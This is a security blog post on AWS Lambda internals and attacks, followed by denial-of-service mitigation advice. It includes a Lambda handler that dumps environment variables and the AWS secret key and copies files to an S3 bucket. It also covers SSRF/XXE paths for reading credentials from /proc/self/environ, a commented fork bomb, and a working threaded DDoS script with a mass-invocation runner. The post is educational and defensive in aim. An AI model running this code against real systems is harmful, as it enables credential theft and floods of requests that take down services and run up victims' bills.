---
layout: post
title: Lets
---

<p align="center">
<img width="600" src="/images/htl.png">
</p>

Since a Lambda function is stateless and sandboxed, the code gets injected and executed into a disposable environment which is very volatile. The picture below describes a very high level architecture of the behavior of a Lambda function, that can be watched from outside or a high-level perspective.

<p align="center">
<img width="600" src="/images/anatomy-of-a-lambda.png">
</p>

<br>
<br>

<p align="center">
<img width="600" src="/images/reverse-eng-htl.png">
</p>

With the anatomy of AWS Lambda in mind it’s time to reverse engineer and find out if there are some interesting assets around. Let`s perform a temple run, to look behind the curtain. To do so we rely on some Python scripting and Linux knowledge. All source code used can be found below or [here](https://github.com/BenjiTrapp/smashing-aws-lambda)

```python
import boto3, json, sys, os, base64

def lambda_handler(event, context):
    client = boto3.client('lambda', region_name='eu-central-1')
    
    commands = [
        ##################################################
        ### ENTERING THE TEMPLE                        ###
        ##################################################
        'whoami',                       # who am I? 
        'pwd',                          # where are we? 
        'ls',                           # take a first look around
        'cat /proc/1/cgroup',           # looking a little bit more around
        'cat /etc/os-release',          # On which OS are we running?
 
        ##################################################
        ### RAID THE TEMPLE                            ###
        ##################################################
        'env && env > /tmp/env.txt',    # IAM Credentials lurking in the dark
        'echo $AWS_SECRET_ACCESS_KEY',  # get the secret key
        
        ### are there any other treasures?
        'ls /var',
        'ls /var/runtime/',
        
        ### Attempts to messing around in the tomb and head to the exit
        'echo "TEST" >> /var/task/lambda_function.py'
        'cat /var/task/lambda_function.py',
        'echo "Yay, we got persistance" > /tmp/persistance.test',

        ##################################################
        ### ADDITIONAL THINGS (Optional)               ###
        ### ATTEMPTS TO DESTRUCT AND ESCAPE THE TEMPLE ###
        ##################################################
        # Reconing
        #'ulimit -a', # Find out the current maximum processes a 
        'cat /proc/cpuinfo > /tmp/cpu_info.txt', # Infos about the CPU
        
        # let's try to set up the bomb and annoy AWS 
        #"fork() {fork | fork & } fork", 
        #'for((i=1;i<=10000000;i+=2)); do sleep 10s; cat /proc/1/cgroup; echo "Still alive? $i times"; done'
    ]
    
    result = dict()
    
    ### Let's do the temple run 
    #            _
    #          _( }
    # -=  _  <<  \
    #    `.\__/`/\\
    #-=    '--'\\  `
    #   -=     //
    #          \)
    for command in commands:
        print(f"[+] Processing command: {command}")
        print(os.system(command))
        print("[+] Done\n")
    
    
    ### Save our treasures in the backpack  
    ### => Don't forget to create a bucket named s3_backpack :)
    res_s3 = boto3.resource('s3')
    res_s3.meta.client.upload_file('/var/runtime/bootstrap.py', 's3_backpack', 'bootstrap.py')
    res_s3.meta.client.upload_file('/tmp/persistance.test', 's3_backpack', 'persistance.test.txt')
    res_s3.meta.client.upload_file('/tmp/cpu_info.txt', 's3_backpack', 'cpu_info.txt')
    res_s3.meta.client.upload_file('/tmp/env.txt', 's3_backpack', 'env.txt')
    res_s3.meta.client.upload_file('/var/task/lambda_function.py', 's3_backpack', 'lambda_function.py')
    
    return {'statusCode': 200}
```
After running the code and using some of the known facts regarding AWS Lambda, we can wrap it up to the following list:
* Runs on an Amazon Linux (RHEL derivative).
* According to environment variables, it runs in - EC2 but must be some kind of container system
* Read-only file system - this tackles persistance
* NON-root user 
* Single AWS IAM role required for access to sandbox
* Reverse sell not possible since it runs airgapped
* Code is copied to `/var/run/task`
* Bootstrap under `/var/runtime/awslambda` <- entry point and backbone of AWS Lambda
* Sandbox is thrown away at the end of execution and have a maximum execution time
* Cold start penalty at initial start for ~600ms 

With the knowledge we captured, we have some very valuable information. If we put all the pieces together the result might look like this treasure map:

<p align="center">
<img width="600" src="/images/lambda-architecture.png">
</p>

Based on this, we can meditate about the [attack surface]( https://en.wikipedia.org/wiki/Attack_surface). Based on the Anatomy of a Lambda Function from above, we can only strike by injection Code or hook into the execution of the Lambda. From here we can derive an attack strategy. Like the Deathstar, we have only the chance to hit a tiny thermal exhaust port to get in. The good news, after a perfect hit the attack surface is like the Tardis: `It’s bigger on the inside!`


<p align="center">
<img width="600" src="/images/DNb.gif">
</p>

Let’s check our options and strategies:
* Keep the initial Payload as small as possible (don't try to push an elephant through a keyhole, a fly might fit better)
* Use Command Injection, XXE, SSRF or trick the API Gateway to find a way in (the thermal exhaust port)
* Since a Sandbox gets recycled after each execution and have a limited execution time (often only a few miliseconds to seconds). Therefore we have to move fast
* Persistence is possible in `/tmp` => To avoid the coldstart penalty, people tend to keep their Lambda function warm (for the sake of performance). This can be used to get some sort of persistance
Identify 
* Perform„lateral movement“ options as soon as possible
* Exfiltrate results via other ways/services (push to S3, SQS, SNS Topic etc.)

<p align="center">
<img width="600" src="/images/lambda-architecture-busted.png">
</p>

Based on our attack strategy, we have a big and complex blob. To manage this blob we try to abstract it and split it into three sections:
1.	`Outer Attack Surface` -> The way/flaw inside
2.	`Inner Attack Surface` -> If we made it inside, there are plenty of things we can use to leverage further attacks
3.	`IAM/Privilege Escalation` -> The Quote of Jeff Bryner ([@0x7eff](https://twitter.com/0x7eff) says it all: `IAM is the “killer feature” and the “killer feature”`

Here's what we can do based on the three sections:
* Compromise data 
* Abuse business logic
* Bypass authentication
* Leak secrets
* Denial of service
* Financial exhaustion/ Denial of Wallet
* Execute malicious code
* ...surely much more nasty things

Now we can start planning our attacks and think about different ways to stop an adversary.

<p align="center">
<img width="700" src="/images/lambda-iam.png">
</p>

In the reverse engineering part above we already learned that IAM credentials are passed into the Lamda function via environment variables. Let’s go one step back, and rethink our attack vectors. As an adversary it can be hard to read environment variables, so we need to abuse another weakness to achieve this. Those weaknesses could be:

1. [XML External Entities (XXE)](https://cwe.mitre.org/data/definitions/1030.html) to achive the ability to read files
2. [Server Side Ressource Forgery (SSRF)]( CWE - CWE-918: Server-Side Request Forgery (SSRF) (4.6) (mitre.org)) which is the most likely variant of both. Since [everything is a file](https://en.wikipedia.org/wiki/Everything_is_a_file) it`s easy to get your hand on files from outside and even bypass firewalls, because it allows the file protocol 

<br>
<p align="center">
<img width="150" src="/images/lets-raid.png">
</p>

With both weaknesses in mind, we can access the IAM credentials by reading the file `/proc/self/environ`. 
In the case that a direct call on `/proc/self/environ` is blocked by a WAF – it sometimes work to read the environment variables of other processes. This can be achieved by reading `/proc/##/environ`, where '##' is a digit (usually) between 1 and 20.

> Good to know: Unlike the IAM credentials which are associated with EC2 instances, there is no [GuardDuty](/aws/avoiding-detection/steal-keys-undetected/) alert in place to watch stolen Lambda credentials.
Beside the IAM credentials a Lambda function also has event data present. These are usually passed into the function when it‘s starting. This data is made available to the function via the [runtime interface](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html). Unlike IAM credentials, this data can be accessed over genuine SSRF at `http://localhost:9001/2018-06-01/runtime/invocation/next`. This will include information about what invoked the Lambda function and may be valuable depending on the context that is injected. From this point there are a lot of options thinkable. Command Injection ist he most likely attack path for this
 
<br><br>
<p align="center">
<img width="500" src="/images/e30fa9fdb78da311be32f4da56a67db1.png">
</p>

<br><br>
<p align="center">
<img width="500" src="/images/postels-law.png">
</p>

Postel‘s Law is to be honest, a pretty awesome academic concept for the development of Internet standards. His Law affected RFC 761 regarding the TCP Protocol. This is better known, as the [robustness principle](https://en.wikipedia.org/wiki/Robustness_principle) and had the intention of a freethinking pioneer in an ideal academic world. Since bad or stupid people are also using the internet today, he laid the baseline for DDoS. To understand the options to mitigate, we need to understand possible attacks. Therefore let's create a playground for this ([GitHub-Repo is here](https://github.com/BenjiTrapp/smashing-aws-lambda))

Let's start with our Victim Function:
```python
mport time
from random import seed
from random import randint

asimov_quotes = ["The saddest aspect of life right now is that science gathers knowledge faster than society gathers wisdom.",
    "In life, unlike chess, the game continues after checkmate",
    "Your assumptions are your windows on the world. Scrub them off every once in a while, or the light won't come in.",
    "Violence is the last refuge of the incompetent.",
    "Properly read, the Bible is the most potent force for atheism ever conceived.",
    "Self-education is, I firmly believe, the only kind of education there is.",
    "If knowledge can create problems, it is not through ignorance that we can solve them.",
    "Those people who think they know everything are a great annoyance to those of us who do.",
    "The most exciting phrase to hear in science, the one that heralds the most discoveries, is not \"Eureka!\" (I found it!) but 'That's funny...",
    "Life is pleasant. Death is peaceful. It's the transition that's troublesome." ]

def lambda_handler(event, context):
    
    time.sleep(randint(1, 4))
    
    return {
        'statusCode': 200,
        'body': asimov_quotes[randint(0, 10)] + " - Isaac Asimov"
    }
```

This function wastes some time and prints as a result of it's pseudo calculation a quote from my favorite Sci-Fi book author Isaac Asimov. I kept the settings of the Lambda like they were shipped from AWS. To make it a little more interresting - and reusable as a "load testing" Tool we create a Lambda function that performs a DDoS attack. Very crazy to use a Lambda to DDoS a Lambda function, right? Anyway - let's move on and crate a Lambda named lambda_spammer and add the content from below:

```python
import json
from urllib.request import urlopen
import threading

def lambda_handler(event, context):
    threads = []
    
    for request in range(event['num_requests']):
        print(request)
        thread = threading.Thread(target=send_request, args=(event['url'],))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()
    
    return {
        'statusCode': 200,
        'body': json.dumps({"success":True})
    }

def send_request(url):
    with urlopen(url) as response:
        response_content = response.read().decode('utf-8')

if __name__ == "__main__":
    lambda_handler({"url": <Enter your Website here>, "num_requests": 1000}, None)
 ```
 The lambda function from above, will send a predefined number of asynchronous requests to your website. To multiply this we can multiply the SPAM by creating  a runner, that will call the lambda for another big predefined number of times asynchronously. This multiplication will resulting intp tons of requests which get fired in a very short amount of time and summon up a tsunami that will hit your website:
 
 ```python
import boto3
import json

lambda_client = boto3.client('lambda')

for x in range(1000):
    print(x)
    response = lambda_client.invoke(
        Payload=json.dumps({"url":<Your Website>, "num_requests": 1000}).encode(),
        FunctionName='lambda_spammer',
        InvocationType='Event'
    )

print(response)
 ```
Use this runner on your local machine to invoke the tsunami and test if the victim function can survive 🌊🌊🌊

<br><br>
<p align="center">
<img width="250" src="/images/mitigation.png">
</p>

Time to stop the kids from playing around and check the options we have to mitigate the (D)DoS attack:
* The no-brainer - Increase the [Concurrency Limit](https://docs.aws.amazon.com/lambda/latest/dg/gettingstarted-limits.html)
* Check your code - Make sure your code does not "hang" on unexpected input. You should carefully check all edge cases and think about possible inputs that may cause function timeouts, [ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) attacks, or long payloads. An attacker may take advantage of this weakness.
* If you don't want to get a huge bill at some point — set up the billing alerts. It's very easy and fast to set up (it's better to do it through AWS Budgets than through AWS SNS and AWS Cloudwatch), but it's very useful — you will be informed in case of a problem.
* The AWS Lambda has a default limit on the number of concurrent executions per account per region. And if your functions exceed this limit, additional user requests will be throttled by AWS with 429 status. But the concurrency level can be set on per-function bases. Besides AWS Lambda, the API Gateway supports throttling as well. The defaults are reasonable - but you can alter them however you like. For example: Five calls/scond can be allowed, if it makes sense for your application. Afte hitting the Limit the API Gateway will block all additional requests.
* Use AWS Cloudfront: HTTP and HTTPS requests sent to CloudFront can be monitored, and access to application resources can be controlled at the edge locations using AWS WAF. Based on the conditions you specify in the AWS WAF, such as the IP addresses from which the requests originate or the values of query strings, traffic can be allowed, blocked, or allowed and counted for further investigation
* Stay serverless and use a tool like [aws-lambda-ddos-hangman](https://github.com/moznion/aws-lambda-ddos-hangman). This tool runs serverless and creates a FIFO queue for the incoming requests and rotates them. This is actually a very clever and cheap solution if you don't want the exta costs for running an API Gateway, Cloudfront and/or AWS WAF/Shield. 

#### Happy fire fighting 🔥🚒

<p align="center">
<img width="600" src="/images/firefighter.png">
</p>


